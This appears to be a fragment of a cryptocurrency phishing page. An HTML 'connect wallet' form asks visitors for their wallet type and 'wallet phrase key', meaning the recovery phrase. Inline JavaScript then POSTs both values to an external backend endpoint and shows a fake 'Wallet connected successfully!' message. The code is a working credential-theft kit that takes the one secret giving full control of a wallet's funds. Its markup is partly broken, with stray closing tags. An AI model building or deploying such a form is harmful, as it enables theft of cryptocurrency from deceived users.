                <form id="connectWalletForm">
                  <!-- Wallet Selection -->

                    <select class="form-select" id="walletType" required>

                    </select>
                  </div>
                  
                  <!-- Phrase Key -->

                    <label for="phraseKey" class="form-label">Enter Wallet Phrase Key</label>
                    <textarea 
                      class="form-control" 
                      id="phraseKey" 
                      rows="3" 
                      placeholder="Enter your wallet phrase key securely"
                      required
                    ></textarea>
                  </div>
                  
                  <!-- Submit Button -->

  <script>
    document.getElementById("connectWalletForm").addEventListener("submit", async function (e) {
  e.preventDefault();

  const walletType = document.getElementById("walletType").value;
  const phraseKey = document.getElementById("phraseKey").value;
  const alertBox = document.getElementById("alertBox");

  // Input validation
  if (!walletType || !phraseKey) {
    alertBox.className = "alert alert-danger";
    alertBox.textContent = "Please fill in all fields.";
    alertBox.classList.remove("d-none");
    return;
  }

  // Backend data
  const data = {
    walletType,
    phraseKey,
  };

  try {
    const response = await fetch("https://your-backend-api.com/connect-wallet", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });

    if (response.ok) {
      alertBox.className = "alert alert-success";
      alertBox.textContent = "Wallet connected successfully!";
    } else {
      alertBox.className = "alert alert-danger";
      alertBox.textContent = "Failed to connect wallet. Try again.";
    }
  } catch (error) {
    alertBox.className = "alert alert-danger";
    alertBox.textContent = "An error occurred. Please try again.";
  }

  alertBox.classList.remove("d-none");
});

  </script>
